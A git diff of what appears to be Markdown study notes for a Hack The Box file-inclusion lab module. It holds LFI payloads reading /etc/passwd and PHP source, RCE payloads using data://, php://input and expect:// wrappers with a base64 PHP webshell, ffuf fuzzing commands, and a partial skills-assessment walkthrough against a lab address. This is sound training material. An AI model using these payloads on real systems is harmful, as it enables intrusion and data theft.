@@ -20,7 +20,7 @@
 | `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) [Appended Extension - Path Truncation](https://academy.hackthebox.com/module/23/section/1491) |
 | `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | This bash script will produce the required 2048 times string traversal path to filter and truncate the php extension. |
 | `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with `null byte` (obsolete) |
-| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter - [PHP Filters](https://academy.hackthebox.com/module/23/section/1492) |
+| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read source code for the PHP page with base64 filter - [Source Code Disclosure using PHP Filters](https://academy.hackthebox.com/module/23/section/1492) |
 
 
 ## Remote Code Execution  
@@ -33,7 +33,7 @@
 | **Command** | **Description** |
 | --------------|-------------------|
 | `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE [Remote Command Execution with data wrapper](https://academy.hackthebox.com/module/23/section/253) |
-| `echo '<?php system($_GET["cmd"]); ?>' | base64` | Produce the base64 string `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==` used above webshell that can be passed in to the data wrapper to get command execution |
+| ```echo '<?php system($_GET["cmd"]); ?>' | base64``` | Produce the base64 string `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==` used above webshell that can be passed in to the data wrapper to get command execution |
 | `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` | Checking PHP Configurations, Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value |
 | `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
 | `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
@@ -82,7 +82,7 @@
 | `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` | Fuzz LFI payloads with [LFI wordlists](https://academy.hackthebox.com/module/23/section/1494) |
 | `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
 | `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
-| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
+| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) | SecLists Fuzzing LFI |
 | [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
 | [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
 | [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
@@ -122,7 +122,7 @@ GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f.
 
 # Skills Assessment - File Inclusion  
 
->[Scenario](https://academy.hackthebox.com/module/23/section/513)  
+>[LFI Skill Scenario](https://academy.hackthebox.com/module/23/section/513)  
 >The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. 
 >They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.
 
@@ -132,6 +132,52 @@ GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f.
 
 >Identify LFI or file inclusion injection point.  
 
+```
+ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.252.24:46462/FUZZ.php
+```  
+
+![LFI-skills-assess-ffuf](/images/LFI-skills-assess-ffuf-1.png)  
+
+>From the Identified pages on root of web app , searching for parameters on each page:  
+
+```
+ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.24:46462/about.php?FUZZ=value'
+```  
+
+Identified parameter: `http://83.136.252.24:46462/index.php?page=value`  
+
+### PHP Filter Read  
+
+>Get the source code of the `index.php` page, but do not include `php` extension as the web application append it automatically.  
+
+```
+GET /index.php?page=php://filter/read=convert.base64-encode/resource=index 
+```  
+
+>Convert response base64 string to php code:  
+
+```
+echo 'PCFET0NUWVBFIGh0hjyrujwergwrtbWw <snip> teyrjetyjtryjrytjCg== | base64 -d > index.php
+cat index.php | grep -ie 'Admin'
+```  
+
+![LFI-skills-assess-php-filter-source-code](/images/LFI-skills-assess-php-filter-source-code.png)  
+
+>Extract with same method `error.php` and `main.php` source code.  
+
+>Discover this php comment in the source code:  
+
+```
+// echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
+```
+
+![LFI-skills-assess-identified](/images/LFI-skills-assess-identified.png)  
+
+>By Assessing the admin page discovered in the PHP source code comment, and using the `log` parameter to read files. 
+>This technique to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.  
 
 
 
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.24:46462/fuzz.php'
+
+ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.252.24:46462/FUZZ.php
